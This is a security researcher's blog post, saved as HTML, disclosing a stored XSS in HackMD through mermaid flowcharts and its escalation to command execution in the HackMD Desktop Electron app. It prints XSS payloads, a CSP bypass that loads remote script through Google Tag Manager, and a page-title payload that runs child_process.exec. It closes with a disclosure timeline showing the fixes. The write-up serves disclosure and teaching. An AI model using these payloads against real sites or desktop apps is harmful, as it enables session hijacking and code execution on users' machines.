@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>HackMD Stored XSS and HackMD Desktop RCE | 5alt&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in my talk at Defcon 27 and here are more details. The story begains from a XSS in a popular flow chart library called me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMD Stored XSS and HackMD Desktop RCE">
+<meta property="og:url" content="http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/index.html">
+<meta property="og:site_name" content="5alt&#39;s Blog">
+<meta property="og:description" content="It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in my talk at Defcon 27 and here are more details. The story begains from a XSS in a popular flow chart library called me">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://5alt.me/images/201907/hackmd_xss_1.png">
+<meta property="og:image" content="http://5alt.me/images/201907/hackmd_xss_2.png">
+<meta property="og:image" content="http://5alt.me/images/201907/hackmd_xss_3.png">
+<meta property="og:image" content="http://5alt.me/images/201907/hackmd_xss_4.png">
+<meta property="og:updated_time" content="2019-10-04T12:54:03.917Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HackMD Stored XSS and HackMD Desktop RCE">
+<meta name="twitter:description" content="It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in my talk at Defcon 27 and here are more details. The story begains from a XSS in a popular flow chart library called me">
+<meta name="twitter:image" content="http://5alt.me/images/201907/hackmd_xss_1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="5alt&#39;s Blog" type="application/atom+xml">
+    
+
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-61217444-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">5alt&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/about">关于我</a>
+                
+                    <a class="main-nav-link" href="/learn">Learn</a>
+                
+                    <a class="main-nav-link" href="/wiki">WIKI</a>
+                
+                    <a class="main-nav-link" href="/tools">小工具</a>
+                
+                    <a class="main-nav-link" href="/talks">Talks</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于我</a></td>
+                
+                    <td><a class="main-nav-link" href="/learn">Learn</a></td>
+                
+                    <td><a class="main-nav-link" href="/wiki">WIKI</a></td>
+                
+                    <td><a class="main-nav-link" href="/tools">小工具</a></td>
+                
+                    <td><a class="main-nav-link" href="/talks">Talks</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">md5_salt</h2>
+            <h3 id="title">Researcher</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>Beijing, China</span>
+            <a id="follow" target="_blank" href="https://github.com/5alt/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                30
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                0
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/5alt/" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://twitter.com/md5_salt" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/atom.xml" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-HackMD Stored XSS and HackMD Desktop RCE" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            HackMD Stored XSS and HackMD Desktop RCE
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2019/10/HackMD Stored XSS and HackMD Desktop RCE/">
+            <time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished">2019-10-04</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/web/">web</a>
+    </div>
+
+                        
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>It’s time to share a stored XSS case I found in HackMD. I have demonstrated it in <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Junyu-Zhou-and-Ce-Qin-and-Jianing-Wang-Web2Own-Attacking-Desktop-Apps-From-Web-Securitys-Perspective.pdf" target="_blank" rel="noopener">my talk</a> at Defcon 27 and here are more details.</p>
+<p>The story begains from a XSS in a popular flow chart library called <a href="https://mermaidjs.github.io/" target="_blank" rel="noopener">mermaid</a>. We have found three diffrent type of XSS in mermaid, you can see it <a href="https://github.com/knsv/mermaid/issues/869" target="_blank" rel="noopener">here</a>.<br><a id="more"></a><br>The first one:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">B --&gt; C&#123;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&#125;</span><br></pre></td></tr></table></figure>
+<p>The second one:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    click B callback &quot;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>The third one(needs click, both nodes will work):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    alert`md5_salt`--&gt;B;</span><br><span class="line">    click alert`md5_salt` eval &quot;Tooltip for a callback&quot;</span><br><span class="line">    click B &quot;javascript:alert`salt`&quot; &quot;This is a tooltip for a link&quot;</span><br></pre></td></tr></table></figure>
+<p>From the three PoCs we can see, in the first two cases, html code in the <em>node name</em> is not escaped and can be rendered in the page, which leads to XSS. The last one is slightly different, we use a feature called <a href="https://mermaidjs.github.io/#/flowchart?id=interaction" target="_blank" rel="noopener">interaction</a>.</p>
+<p>From the document we can see:</p>
+<blockquote>
+<p>It is possible to bind a click event to a node, the click can lead to either a javascript callback or to a link which will be opened in a new browser tab.</p>
+</blockquote>
+<p>This feature can be used as a click-XSS attack.</p>
+<p>But the callback function must be pre-defined, which should be found in <code>window</code> object. The sample code is as follows.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[callback](node_name)</span><br></pre></td></tr></table></figure>
+<p>Mermaid is widely used in markdown editors, HackMD is one.</p>
+<p>I just copy &amp; paste the payload but nothing happened. The payload is blocked by CSP. The CSP is as follows.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &apos;none&apos;; script-src &apos;self&apos; vimeo.com https://gist.github.com www.slideshare.net &apos;unsafe-eval&apos; https://assets.hackmd.io https://www.google.com https://apis.google.com https://docs.google.com https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com https://cdn.ravenjs.com https://browser.sentry-cdn.com &apos;nonce-cdbbafd5-903e-443c-bb33-c25b0cc73e21&apos; &apos;sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=&apos; &apos;sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=&apos; &apos;sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI=&apos;; img-src * data:; style-src &apos;self&apos; &apos;unsafe-inline&apos; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src &apos;self&apos; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com; object-src *; media-src *; frame-src *; child-src *; connect-src *; base-uri &apos;none&apos;; form-action &apos;self&apos; https://www.paypal.com; upgrade-insecure-requests</span><br></pre></td></tr></table></figure>
+<p>I found a <a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_&amp;_Bypass_CSP.md" target="_blank" rel="noopener">write up</a> about how to bypass HackMD’s CSP. It uses <code>Google Tag Manager</code> to inject custom javascript code in <code>https://www.google-analytics.com</code>, which is whitelisted in the HackMD’s CSP.</p>
+<p>So, our payload can be:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">B --&gt; C&#123;&lt;script src=https://www.google-analytics.com/gtm/js?id=GTM-TQGSV3G &gt;&lt;/script&gt;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/201907/hackmd_xss_1.png" alt><br>or<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    click B callback &quot;&lt;script src=https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G &gt;&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/201907/hackmd_xss_2.png" alt></p>
+<p>How about the callback function one? Let’s review the vulnerable code.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[callback](node_name)</span><br></pre></td></tr></table></figure>
+<p>We can only use the object directly in window, for example, <code>window[&#39;document&#39;]</code>, and <code>window[&#39;document.write&#39;]</code> wouldn’t work. And we can not have some special chars such as <code>()[]{}\@%^|&lt;&gt;</code> in the node name.  Besides, in the CSP, we have <code>unsafe-eval</code> and no <code>unsafe-inline</code>.</p>
+<p>Getting the alert box is easy.</p>
+<p><img src="/images/201907/hackmd_xss_3.png" alt></p>
+<p>But I want to execute arbitrary code.</p>
+<p>I made a few tries.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'eval'</span>](<span class="string">"location='javascript:alert`1`'"</span>)</span><br></pre></td></tr></table></figure>
+<p>This one violates the CSP.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'eval'</span>](<span class="string">"atob`YWxlcnQoMSk=`"</span>)</span><br></pre></td></tr></table></figure>
+<p>This one can decode the base64 payload but the payload cannot execute.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="string">'import'</span>](<span class="string">"https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G"</span>)</span><br></pre></td></tr></table></figure>
+<p>This one failed because <code>import</code> is <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import" target="_blank" rel="noopener">a statement</a> so <code>window[&#39;import&#39;] == undefined</code>.</p>
+<p>…</p>
+<p>Finally I noticed HackMD has jQuery in the context. It’s easy to import a remote javascript file using <code>$.getScript</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    $.getScript`https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G`--&gt;B;</span><br><span class="line">    click $.getScript`https://www.google-analytics.com/gtm/js?id=GTM-TQ6RV7G` eval &quot;Tooltip for a callback&quot;</span><br><span class="line">    click B &quot;javascript:alert`2`&quot; &quot;This is a tooltip for a link&quot;</span><br></pre></td></tr></table></figure>
+<p>Finally, I got the alert box!</p>
+<p><img src="/images/201907/hackmd_xss_4.png" alt></p>
+<p>Before I was going to report the issue, I found HackMD has <a href="https://github.com/hackmdio/hackmd-desktop" target="_blank" rel="noopener">a desktop application</a>. Let’s turn this XSS to RCE!</p>
+<p>HackMD Desktop uses Electron framework. It renders the web page from hackmd.io in a safe <code>webview</code> tag.</p>
+<p>Let’s see the main page of the HackMD Desktop.</p>
+<p>There is a <code>renderer.js</code> executed in the privileged context.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// renderer.js</span></span><br><span class="line"><span class="keyword">let</span> targetURL</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.location.search !== <span class="string">''</span>) &#123;</span><br><span class="line">    targetURL = <span class="built_in">window</span>.location.search.match(<span class="regexp">/\?target=([^?]+)/</span>)[<span class="number">1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    targetURL = getServerUrl()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.innerHTML += <span class="string">`&lt;webview src="<span class="subst">$&#123;targetURL&#125;</span>" id="main-window" disablewebsecurity autosize="on" allowpopups allowfileaccessfromfiles&gt;&lt;/webview&gt;`</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* handle _target=blank pages */</span></span><br><span class="line">webview.addEventListener(<span class="string">'new-window'</span>, (event) =&gt; &#123;</span><br><span class="line">    ipcClient(<span class="string">'createWindow'</span>, &#123; <span class="attr">url</span>: <span class="string">`file://<span class="subst">$&#123;path.join(__dirname, <span class="string">`index.html?target=<span class="subst">$&#123;event.url&#125;</span>`</span>)&#125;</span>`</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>From the code we can see, if you create a new window, the <code>targetURL</code> parameter will be concatenated into the template. If we can close the double quote of the <code>src</code> atttibute in the <code>webview</code> tag and inject <a href="https://electronjs.org/docs/api/webview-tag#nodeintegration" target="_blank" rel="noopener"><code>nodeintegration</code> atttibute</a>, then we can use native modules to execute any command.</p>
+<p>This failed because the double quote is url encoded.</p>
+<p>Quickly I noticed another piece of code.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// renderer.js</span></span><br><span class="line">webview.addEventListener(<span class="string">'dom-ready'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// set webview title</span></span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'#navbar-container .title'</span>).innerHTML = webview.getTitle()</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'title'</span>).innerHTML = webview.getTitle()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>When the DOM in the webview tag is ready, the main page will get the webview’s title and set to the main page using <code>innerHTML</code>.</p>
+<p>We can use XSS to redirect the page from hackmd.io to our evil page with payload in the page title.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">"process.mainModule.require('child_process').exec('open /Applications/Calculator.app')"</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>And then we can see the calculator!</p>
+<video controls><br>    <source src="/images/201907/hackmd_rce.mp4" type="video/mp4"><br><br>    Sorry, your browser doesn’t support embedded videos.<br></video>
+
+<h2 id="Responsible-Disclosure"><a href="#Responsible-Disclosure" class="headerlink" title="Responsible Disclosure"></a>Responsible Disclosure</h2><ul>
+<li>07/03/2019 Report the HackMD <a href="https://github.com/hackmdio/codimd/issues/1233" target="_blank" rel="noopener">XSS issue</a></li>
+<li>07/08/2019 Report the HackMD desktop <a href="https://github.com/hackmdio/hackmd-desktop/issues/18" target="_blank" rel="noopener">RCE issue</a></li>
+<li>07/11/2019 HackMD <a href="https://github.com/hackmdio/hackmd-desktop/pull/19" target="_blank" rel="noopener">fixed the RCE in HackMD Desktop</a></li>
+<li>07/29/2019 HackMD <a href="https://github.com/hackmdio/codimd/pull/1242" target="_blank" rel="noopener">fixed the XSS</a></li>
+</ul>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/" data-id="ck1c4u1p6000296pj6h1ywwb0" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2019/02/xss-in-azure-devops/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">How I alert(1) in Azure DevOps</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/10/HackMD Stored XSS and HackMD Desktop RCE/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2019/10/HackMD Stored XSS and HackMD Desktop RCE/" class="title">HackMD Stored XSS and HackMD Desktop RCE</a></p>
+                            <p class="item-date"><time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished">2019-10-04</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/02/xss-in-azure-devops/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2019/02/xss-in-azure-devops/" class="title">How I alert(1) in Azure DevOps</a></p>
+                            <p class="item-date"><time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished">2019-02-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/奇技淫巧/">奇技淫巧</a></p>
+                            <p class="item-title"><a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="title">某开发工具沙箱绕过导致RCE</a></p>
+                            <p class="item-date"><time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/以太坊/">以太坊</a></p>
+                            <p class="item-title"><a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="title">批量扫描智能合约中的整数溢出问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-25T16:00:00.000Z" itemprop="datePublished">2018-04-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="title">weblogic反序列化漏洞分析与调试</a></p>
+                            <p class="item-date"><time datetime="2018-04-19T16:00:00.000Z" itemprop="datePublished">2018-04-20</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/radio/">radio</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/云安全/">云安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/以太坊/">以太坊</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂/">杂</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向/">逆向</a><span class="category-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" 